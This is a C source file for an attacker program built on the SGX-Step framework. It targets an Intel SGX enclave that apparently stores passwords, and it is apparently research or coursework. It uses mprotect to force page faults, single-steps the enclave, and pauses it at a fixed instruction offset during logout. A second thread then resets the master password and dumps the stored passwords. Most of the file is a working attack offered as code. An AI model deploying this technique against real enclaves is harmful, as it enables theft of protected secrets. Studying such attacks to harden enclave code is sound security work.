/* utility headers */

#include <sys/mman.h>
#include <signal.h>
#include "sgx-step/libsgxstep/apic.h"
#include "sgx-step/libsgxstep/cpu.h"
#include "sgx-step/libsgxstep/pt.h"
#include "sgx-step/libsgxstep/sched.h"
#include "sgx-step/libsgxstep/elf_parser.h"
#include "sgx-step/libsgxstep/enclave.h"
#include "sgx-step/libsgxstep/debug.h"
#include "sgx-step/libsgxstep/config.h"
#include "sgx-step/libsgxstep/idt.h"
#include "sgx-step/libsgxstep/config.h"
#include "sgx-step/libsgxstep/cache.h"
#include <string.h>  // For memcpy
#include "Enclave/encl_u.h"  // For test_dummy

/* SGX untrusted runtime */
#include <sgx_urts.h>
#include "Enclave/encl_u.h"
#include <pthread.h>
#include "mystruct.h"


#define DO_TIMER_STEP      0
int irq_cnt = 0, do_irq = 0, fault_cnt = 0, trigger_cnt = 0, step_cnt = 0;
uint64_t *pte_encl = NULL, *pte_trigger = NULL, *pmd_encl = NULL;
void *code_adrs, *trigger_adrs;

// THREADING INIT
int turn = 0; // 0 for thread_A, 1 for thread_B
pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;
pthread_cond_t cond = PTHREAD_COND_INITIALIZER;

sgx_enclave_id_t create_enclave(void)
{
    sgx_launch_token_t token = {0};
    int updated = 0;
    sgx_enclave_id_t eid = -1;

    info_event("Creating enclave...");
    SGX_ASSERT( sgx_create_enclave( "./Enclave/encl.so", /*debug=*/1,
                                    &token, &updated, &eid, NULL ) );

    return eid;
}
void ocall_print(const char *str)
{
    info("ocall_print: enclave says: '%s'", str);
}

// !!! pointer a has to be uint64_t and not char*
void ocall_print_address(const char *str, uint64_t a)
{
    info("ocall_print_address: enclave says: '%s' '%p'",str, (void*)a);
}

void ocall_print_password(const char *pw) {
    printf("Decrypted password: %s\n", pw);
}
/* ================== ATTACKER IRQ/FAULT HANDLERS ================= */

/* Called before resuming the enclave after an Asynchronous Enclave eXit. */
void aep_cb_func(void)
{
    info("aep");
    step_cnt++;
    printf("stepcnt %d\n", step_cnt);
    uint64_t erip = edbgrd_erip() - (uint64_t) get_enclave_base();
    info("^^ enclave RIP=%#llx", erip);

    
    if(erip == 0x33a5){ // logout between line 38 and 39
        info("testreach");
        sgx_step_do_trap = 0;

        //change thread to writer thread B
        pthread_mutex_lock(&lock);
        turn = 1; // set turn to thread B
        pthread_cond_signal(&cond); // Wake up thread_B
        while(turn != 0){
            pthread_cond_wait(&cond, &lock);
        }
        pthread_mutex_unlock(&lock); //end turn of thread A

    }

    if(erip == 0x2084){ 
        info("testjaper2");
       

    }



}

/* Called upon SIGSEGV caused by untrusted page tables. */
void fault_handler(int signo, siginfo_t * si, void  *ctx)
{

    info("pf handler");

    ucontext_t *uc = (ucontext_t *) ctx;

    switch ( signo )
    {
      case SIGSEGV:
        ASSERT(fault_cnt++ < 10);

        info("Caught page fault (base address=%p)", si->si_addr);
        
    
        if (si->si_addr == trigger_adrs)
        {
            info("Restoring trigger access rights..");
            
            ASSERT(!mprotect(trigger_adrs, 4096, PROT_READ | PROT_EXEC));
            do_irq = 1;

            #if !DO_TIMER_STEP
                sgx_step_do_trap = 1;
            #endif
        }
        else
        {
            info("Unknown #PF address!");
        }
    
        break;

    #if !DO_TIMER_STEP
      case SIGTRAP:
            
        info("Caught single-step trap (RIP=%p)\n", si->si_addr);
        

        /* ensure RFLAGS.TF is clear to disable debug single-stepping */
        uc->uc_mcontext.gregs[REG_EFL] &= ~0x100;
        break;
    #endif

      default:
        info("Caught unknown signal '%d'", signo);
        abort();
    }

    // NOTE: return eventually continues at aep_cb_func and initiates
    // single-stepping mode.
}



/* ================== ATTACKER INIT/SETUP ================= */

void register_signal_handler(int signo)
{
    struct sigaction act, old_act;

    /* Specify #PF handler with signinfo arguments */
    memset(&act, 0, sizeof(sigaction));
    act.sa_sigaction = fault_handler;
    act.sa_flags = SA_RESTART | SA_SIGINFO;

    /* Block all signals while the signal is being handled */
    sigfillset(&act.sa_mask);
    ASSERT(!sigaction( signo, &act, &old_act ));
}

/* Configure and check attacker untrusted runtime environment. */
void attacker_config_runtime(void)
{
    ASSERT( !claim_cpu(VICTIM_CPU) );
    //ASSERT( !prepare_system_for_benchmark(PSTATE_PCT) ); //VRAAG in die write(file, w)
    //print_system_settings();

    register_enclave_info();
    print_enclave_info();
    register_signal_handler( SIGSEGV );
}

/* Provoke page fault on enclave entry to initiate single-stepping mode. */
void attacker_config_page_table(void)
{
    code_adrs = get_enclave_base() + get_symbol_offset("ecall_clear_all");
    trigger_adrs = (void *)((size_t)code_adrs & ~(4096 - 1));


    info("enclave trigger at %p; code at %p", trigger_adrs, code_adrs);

    
    ASSERT(!mprotect(trigger_adrs, 4096, PROT_NONE ));

    //VRAAG WAT NOG HIER
    
}

// Function for thread A
void* victim_thread(void* arg) {

    // locking for turn, sync logic, thread A sleeps until thread B does a page fault
    pthread_mutex_lock(&lock);
    while (turn != 0) { // Wait until it's thread_A's turn
        pthread_cond_wait(&cond, &lock);
    }
    pthread_mutex_unlock(&lock);
    printf("victim thread running\n");   

    char* masterpw = "super_secret";
    sgx_enclave_id_t eidarg = *(sgx_enclave_id_t*)arg;

    ecall_setup(eidarg);
    //ecall_get_passwords2(eidarg, masterpw);

     /* 1. Setup attack execution environment. */
    register_symbols("./Enclave/encl.so");
    attacker_config_runtime();
    attacker_config_page_table();
    register_aep_cb(aep_cb_func);

    register_signal_handler( SIGTRAP );
    set_debug_optin();
   
    ecall_clear_all(eidarg, masterpw);
}

// Function for thread B

void* attacker_thread(void* arg) {
    // locking for turn, sync logic, thread B sleeps until thread A does amount of page fault
    pthread_mutex_lock(&lock);
    while (turn != 1) { // Wait until it's thread_B's turn
        pthread_cond_wait(&cond, &lock);
    }
    pthread_mutex_unlock(&lock);

    printf("attacker thread running\n");

    sgx_enclave_id_t eidarg = *(sgx_enclave_id_t*)arg;
    ecall_init_master_password(eidarg, "dummy");

    static char password1[64] = "password1";
    static char password2[64] = "password2";
    static char password3[64] = "password3";
    static char password4[64] = "password4";
    static char password5[64] = "password5";
    static char password6[64] = "password6";
    static char password7[64] = "password7";
    static char password8[64] = "password8";
    static char password9[64] = "password9";
    static char password10[64] = "password10";

    struct my_struct output = {
        .array_len = 10,
        .pw_len = 64,
        .passwords = {password1, password2, password3, password4, password5, 
            password6, password7, password8, password9, password10}
    };

    ecall_get_passwords(eidarg, "dummy", &output);

    for (int i = 0; i < output.array_len; ++i) {
        printf("Password %d: %s\n", i, output.passwords[i]);
    }

    // CHANGE FROM THREAD B TO THREAD A
    pthread_mutex_lock(&lock);
    turn = 0; // set turn to thread A  
    pthread_cond_signal(&cond); // Wake up thread_A
    while(turn != 1){
        pthread_cond_wait(&cond, &lock);
    }
    pthread_mutex_unlock(&lock); //end turn of thread B

}


int main( int argc, char **argv )
{

    //Create Enclave
    sgx_enclave_id_t eid = create_enclave();
    int rv = 1, secret = 1;

   



  

    // Create 2 threads
    pthread_t t1, t2;
    pthread_create(&t1, NULL, victim_thread, (void*)&eid);
    pthread_create(&t2, NULL, attacker_thread, (void*)&eid);

    pthread_join(t1, NULL);
   // pthread_join(t2, NULL);



    

}

